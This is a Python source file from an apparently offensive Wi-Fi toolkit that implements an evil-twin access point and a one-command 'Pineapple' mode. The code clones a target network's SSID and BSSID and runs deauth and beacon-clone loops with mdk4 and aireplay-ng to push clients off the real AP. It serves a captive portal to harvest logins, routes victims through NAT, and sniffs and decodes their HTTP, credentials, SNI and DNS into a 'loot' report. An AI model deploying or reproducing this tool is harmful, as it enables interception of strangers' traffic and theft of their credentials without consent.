"""Rogue AP: a complete evil twin, and the Pineapple built on it.

The twin used to be a pair of config files on ``wlan0``. This runs the thing:
configs from :mod:`omni.wifi.rogue`, an address on the AP interface, dnsmasq
(DHCP + DNS, wildcard when a portal is wanted), hostapd, an optional
:mod:`omni.wifi.portal` to harvest a login, optional NAT so victims keep
internet, and optional deauth + BSSID-clone beacons against the *real* AP so
clients prefer ours. While it runs it decodes the interface it is serving —
:class:`omni.wifi.sniff.Sniffer` — so HTTP requests, form/basic credentials,
TLS SNI, certificate names and DNS appear as they happen; with the real PSK a
monitor capture is decrypted in memory as well.

``wifi.pineapple`` is the same machine with the pieces already switched on:
it recons with ``iw`` when no SSID is given, resolves ``UPLINK=auto`` from the
route table, and reports the loot at the end.
"""


from __future__ import annotations

import os
import subprocess
import threading
import time

from omni.core import config, console, platform as host, proc
from omni.core.module import Option
from omni.wifi import iface as iface_mod
from omni.wifi import portal as portal_mod, rogue, scan as scan_mod
from omni.wifi import sniff as sniff_mod, tlsmeta
from omni.wifi.modules._base import WifiModule

__all__ = ["Eviltwin", "Pineapple", "Rogue"]


class Rogue:
    """Process set for one twin, so teardown lives in one place."""

    def __init__(self, outdir: str):
        self.outdir = outdir
        self.procs: list[subprocess.Popen] = []
        self.nat: tuple[str, str] | None = None
        self.portal: portal_mod.Portal | None = None
        self.sniffer: sniff_mod.Sniffer | None = None
        self.capture_path = ""
        self._kick = threading.Event()
        self._kicker: threading.Thread | None = None
        self.stations: set[str] = set()

    # -- start -------------------------------------------------------------
    def write(self, name: str, body: str) -> str:
        path = os.path.join(self.outdir, name)
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(body)
        return path

    def start_ap(self, iface: str, ssid: str, channel: int, bssid: str,
                 psk: str, upstream: str, portal_port: int) -> dict:
        hostapd = self.write("hostapd.conf",
                             rogue.hostapd_conf(iface, ssid, channel, bssid,
                                                psk))
        dnsmasq = self.write("dnsmasq.conf", rogue.dnsmasq_conf(
            iface, upstream=upstream, portal=portal_port > 0,
            log_path=os.path.join(self.outdir, "dnsmasq.log")))
        console.info(f"configs -> {self.outdir}")
        proc.run(host.root_argv(["ip", "addr", "add", f"{rogue.AP_IP}/24",
                                 "dev", iface]), timeout=20)
        proc.run(["ip", "link", "set", iface, "up"], timeout=20)
        self.procs.append(proc.spawn(host.root_argv(
            ["dnsmasq", "-C", dnsmasq, "--no-daemon"])))
        self.procs.append(proc.spawn(host.root_argv(["hostapd", hostapd])))
        time.sleep(2.0)
        return {"hostapd": hostapd, "dnsmasq": dnsmasq}

    def start_nat(self, uplink: str, ap_iface: str) -> None:
        for argv in rogue.nat_rules(uplink, ap_iface):
            res = proc.run(host.root_argv(argv), timeout=20)
            if not res.ok:
                console.warn(f"{' '.join(argv)}: {res.text.strip()[:80]}")
        self.nat = (uplink, ap_iface)

    def start_portal(self, port: int, ssid: str) -> None:
        log = os.path.join(self.outdir, "portal.jsonl")
        self.portal = portal_mod.Portal(port, ssid,
                                        "Enter any account to continue.", log)
        self.portal.start()
        console.ok(f"captive portal on :{port} (log {log})")

    def start_sniff(self, iface: str, psk: str = "", ssid: str = "",
                    live: bool = True) -> None:
        """Capture *and decode* the twin's interface while it runs.

        The clients reach the internet through this box, so their HTTP is
        plaintext here; with the real PSK a monitor capture is decrypted in
        memory and HTTPS still gives up its SNI and certificate names.
        """
        target = os.path.join(self.outdir, "traffic.pcap")
        self.sniffer = sniff_mod.Sniffer(
            iface=iface, pcap_path=target,
            jsonl=os.path.join(self.outdir, "sniff.jsonl"),
            psk=psk, ssid=ssid,
            on_event=sniff_mod.live_printer(not live))
        self.sniffer.start()
        self.capture_path = target
        console.ok(f"sniffing {iface} live -> {target}")

    def start_kick(self, mon: str, bssid: str, ssid: str) -> None:
        """Deauth the real AP and clone its beacon until stopped."""
        def loop() -> None:
            while not self._kick.is_set():
                proc.run(["mdk4", mon, "b", "-b", bssid, "-c", ssid, "-s",
                          "200"], timeout=20)
                proc.run(["aireplay-ng", "--deauth", "8", "-a", bssid, mon],
                         timeout=25)
        self._kicker = threading.Thread(target=loop, name="omni-kick",
                                        daemon=True)
        self._kicker.start()

    # -- stop --------------------------------------------------------------
    def stop(self) -> None:
        self._kick.set()
        if self._kicker is not None:
            self._kicker.join(timeout=25)
            self._kicker = None
        if self.sniffer is not None:
            self.sniffer.stop()          # kept: the report reads it at the end
        for process in self.procs:
            if process is None:
                continue
            try:
                process.terminate()
                process.wait(timeout=5)
            except (OSError, subprocess.SubprocessError):
                pass
        if self.portal is not None:
            self.portal.stop()
            self.portal = None
        if self.nat is not None:
            for argv in rogue.nat_cleanup(*self.nat):
                proc.run(host.root_argv(argv), timeout=15)
            self.nat = None


def _station_poll(ap: Rogue, iface: str, deadline: float,
                  interval: float = 3.0) -> None:
    """Watch for joins until the deadline."""
    while time.time() < deadline:
        out = proc.run(["iw", "dev", iface, "station", "dump"], timeout=10).out
        for mac in rogue.parse_stations(out):
            if mac not in ap.stations:
                ap.stations.add(mac)
                console.ok(f"client joined: {mac}")
        time.sleep(interval)


def resolve_uplink(value: str, skip: str = "") -> str:
    """``auto`` (or ``default``) becomes the interface holding the default route.

    A twin with NAT needs a real way out; asking the operator for the interface
    name is the most common way to get it wrong, so the route table can answer.
    """
    if (value or "").strip().lower() not in ("auto", "default"):
        return value or ""
    routes = proc.run(["ip", "route", "show", "default"], timeout=10).out
    found = rogue.default_uplink(routes, skip=(skip,) if skip else ())
    if not found:
        console.warn("no default route found — running without NAT")
    else:
        console.ok(f"uplink: {found} (from the default route)")
    return found


class Eviltwin(WifiModule):
    NAME = "wifi.eviltwin"
    DESCRIPTION = "Run a rogue twin of an SSID (WPA clone, portal, NAT, deauth)"
    NEEDS = ("hostapd", "dnsmasq")
    OPTIONS = (Option("SSID", "SSID to clone", "", required=True),
               Option("IFACE", "AP interface (needs AP mode)"),
               Option("CHANNEL", "channel to broadcast on", "6"),
               Option("BSSID", "BSSID of the real AP to clone"),
               Option("PSK", "real passphrase: the twin then joins silently"),
               Option("MON", "monitor interface for deauth/clone beacons"),
               Option("DEAUTH", "kick clients off the real AP", "false",
                      choices=("true", "false")),
               Option("UPLINK", "interface with real internet ('auto' asks the "
                                 "route table)"),
               Option("PORTAL", "serve a captive portal", "false",
                      choices=("true", "false")),
               Option("PORT", "portal port", "80"),
               Option("SNIFF", "capture and decode the twin's traffic", "true",
                      choices=("true", "false")),
               Option("LIVE", "print HTTP / HTTPS / creds as they land", "true",
                      choices=("true", "false")),
               Option("SECONDS", "how long to run", "120"))

    def execute(self) -> dict:
        # the AP interface must stay AP-capable: hostapd takes the *base* vif
        # over (monitor mode is only needed for the deauth radio, given as MON)
        iface = self.get("IFACE") or iface_mod.pick(None)
        bssid = self.get("BSSID")
        uplink = resolve_uplink(self.get("UPLINK"), iface)
        wants_kick = self.get_bool("DEAUTH", False)
        if wants_kick and not (self.get("MON") and bssid):
            console.warn("DEAUTH needs MON and BSSID — continuing without it")
            wants_kick = False

        outdir = config.output_dir(f"wifi/twin_{rogue.slug(self.get('SSID'))}")
        run = Rogue(outdir)
        started = time.time()
        try:
            console.info("bringing the twin up" if self.get("PSK")
                         else "bringing the twin up (open — victims must join)")
            run.start_ap(iface, self.get("SSID"), self.get_int("CHANNEL", 6),
                         (bssid or "").lower(), self.get("PSK") or "",
                         "1.1.1.1" if uplink else "",
                         self.get_int("PORT", 80)
                         if self.get_bool("PORTAL", False) else 0)
            if uplink:
                run.start_nat(uplink, iface)
            if self.get_bool("PORTAL", False):
                run.start_portal(self.get_int("PORT", 80), self.get("SSID"))
            if self.get_bool("SNIFF", True):
                run.start_sniff(iface, self.get("PSK") or "",
                                self.get("SSID"), self.get_bool("LIVE", True))
            if wants_kick:
                run.start_kick(self.get("MON"), bssid, self.get("SSID"))
            deadline = started + max(5, self.get_int("SECONDS", 120))
            _station_poll(run, iface, deadline)
        finally:
            run.stop()
            self.restore(iface)

        return _finish(run, time.time() - started)


class Pineapple(WifiModule):
    NAME = "wifi.pineapple"
    DESCRIPTION = "A Pineapple in one command: recon, clone, portal, NAT, sniff"
    NEEDS = ("hostapd", "dnsmasq", "tcpdump")
    OPTIONS = (Option("SSID", "SSID to clone (blank: clone the best AP found)"),
               Option("IFACE", "AP interface (needs AP mode)"),
               Option("CHANNEL", "channel to broadcast on (blank: the twin's)"),
               Option("BSSID", "BSSID of the real AP (blank: the twin's)"),
               Option("PSK", "real passphrase: silent joins + real MITM"),
               Option("MON", "monitor interface for the deauth loop"),
               Option("UPLINK", "interface with real internet", "auto"),
               Option("PORT", "portal port", "80"),
               Option("LIVE", "print HTTP / HTTPS / creds as they land", "true",
                      choices=("true", "false")),
               Option("SECONDS", "how long to run", "300"))

    def execute(self) -> dict:
        """Recon, then the same runner with the hostile parts already on."""
        iface = self.get("IFACE")
        target: dict = {}
        if not self.get("SSID"):
            iface = iface or iface_mod.pick(None)
            target = self._recon(iface)
            if not target:
                raise ValueError("no SSID= given and the scan found nothing "
                                 "to clone")
            console.ok(f"cloning {target['ssid']} ({target['bssid']}, "
                       f"channel {target['channel']}, "
                       f"{target['security']})")
        values = {name.lower(): (opt.value or opt.default)
                  for name, opt in self.opts.items()}
        values.update({
            "iface": iface,
            "ssid": self.get("SSID") or target.get("ssid", ""),
            "bssid": self.get("BSSID") or target.get("bssid", ""),
            "channel": self.get("CHANNEL") or str(target.get("channel", 6)),
            "portal": "true", "sniff": "true",
            "live": self.get("LIVE") or "true",
            "deauth": "true" if self.get("MON") else "false",
        })
        console.info("pineapple = recon + twin + captive portal + NAT + "
                     "deauth + live sniff")
        return Eviltwin(**values).execute()

    def _recon(self, iface: str) -> dict:
        """Ask ``iw`` what is around, and pick the twin worth standing up."""
        try:
            aps = scan_mod.scan_iw(iface)
        except Exception as exc:                 # noqa: BLE001 - no radio
            console.warn(f"recon failed on {iface}: {str(exc)[:80]}")
            return {}
        best = rogue.choose_target(aps)
        if aps:
            console.table(["ssid", "bssid", "ch", "signal", "security"],
                          [[ap.get("ssid", ""), ap.get("bssid", ""),
                            str(ap.get("channel") or ""),
                            str(ap.get("signal") or ""),
                            ap.get("security", "")] for ap in aps[:12]])
        if best is None:
            console.warn("nothing cloneable in range (no SSID + channel)")
        return best or {}



def _finish(run: Rogue, elapsed: float) -> dict:
    """Report what the run collected, then close the books."""
    console.section("what it collected")
    if run.stations:
        console.table(["client"], [[mac] for mac in sorted(run.stations)])
    else:
        console.warn("no client joined — was the real AP kicked? (DEAUTH=true)")
    if run.portal is not None and run.portal.captured:
        console.table(["address", "user", "pass"], run.portal.rows())
    else:
        console.info("no portal submissions")

    live = run.sniffer.report() if run.sniffer is not None else {}
    if live.get("http"):
        console.section("http seen on the wire")
        console.table(["method", "url", "bytes"],
                      [[m["method"], m["url"], str(m["bytes"])]
                       for m in live["http"][:30]])
    if live.get("creds"):
        console.section("credentials")
        console.table(["source", "user", "pass"],
                      [list(cred) for cred in live["creds"][:30]])
    meta: dict = {}
    if run.capture_path and os.path.isfile(run.capture_path):
        try:
            meta = tlsmeta.report(run.capture_path)
        except Exception as exc:                 # noqa: BLE001 - report only
            console.warn(f"sniff read failed: {str(exc)[:100]}")

    hosts = sorted(set(live.get("hosts", [])) | set(meta.get("hosts", [])))
    for host in hosts[:25]:
        console.info(f"leaked host {host}")
    if not hosts and meta.get("encrypted_frames"):
        console.info(f"{meta['encrypted_frames']} encrypted frame(s) — "
                     "run wifi.extract with the PSK for the plaintext")
    console.ok(f"ran {elapsed:.0f}s — artefacts in {run.outdir}")
    return {"seconds": round(elapsed, 1), "clients": sorted(run.stations),
            "captured": [c.as_dict() for c in (run.portal.captured
                                               if run.portal else [])],
            "hosts": hosts, "http": live.get("http", []),
            "creds": live.get("creds", []),
            "decrypted": live.get("decrypted", 0), "outdir": run.outdir,
            "capture": run.capture_path}



